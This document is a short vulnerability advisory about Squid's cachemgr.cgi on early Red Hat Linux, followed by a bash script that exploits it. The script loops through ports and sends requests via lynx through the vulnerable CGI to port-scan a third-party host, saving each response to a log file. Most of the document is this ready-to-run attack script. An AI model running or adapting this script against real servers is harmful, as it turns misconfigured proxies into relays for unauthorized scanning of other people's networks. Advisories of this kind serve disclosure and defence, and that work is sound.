source: http://www.securityfocus.com/bid/2059/info

The 'cachemgr.cgi' module is a management interface for the Squid proxy service. It was installed by default in '/cgi-bin' by Red Hat Linux 5.2 and 6.0 installed with Squid. This script prompts for a host and port, which it then tries to connect to. If a webserver such as Apache is running, this can be used to connect to arbitrary hosts and ports, allowing for potential use as an intermediary in denial-of-service attacks, proxied port scans, etc. Interpreting the output of the script can allow the attacker to determine whether or not a connection was established. 

#!/bin/bash -x

# Port scanning using a misconfigured squid
# using open apache

# Usage miscachemgr host_vuln host_to_scan end_port

# Concept: Jacobo Van Leeuwen & Francisco S?a Mu?oz
# Coded by Francisco S?a Mu?oz
# IP6 [Logic Control]

PORT=1
ONE='/cgi-bin/cachemgr.cgi?host='
TWO='&port='
THREE='&user_name=&operation&auth='

mkdir from_$1_to_$2

while [ $PORT -lt $3 ]; do

# lynx -dump http://$1/cgi-bin/cachemgr.cgi?host=\
# $2&port=$PORT&user_name=&operation=authenticate&auth= > \
# port_$1_to_$2/$PORT.log 2>&1

lynx -dump http://$1$ONE$2$TWO$PORT$THREE > from_$1_to_$2/$PORT.log 2>&1
let PORT=PORT+1

done
